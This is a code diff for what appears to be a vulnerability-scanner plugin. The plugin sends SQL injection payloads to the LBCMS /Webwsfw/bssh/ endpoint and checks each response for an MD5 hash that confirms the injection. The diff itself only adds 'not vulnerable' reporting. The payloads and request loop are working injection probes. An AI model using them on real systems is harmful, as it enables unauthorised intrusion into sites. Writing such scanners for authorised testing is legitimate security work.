@@ -25,14 +25,18 @@ class lbcms_webwsfw_bssh_sqli_BaseVerify:
                     "/Webwsfw/bssh/?object=11%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
                     "/Webwsfw/bssh/?subsite=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--"]
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在LBCMS多处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在lbcms_webwsfw_bssh_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
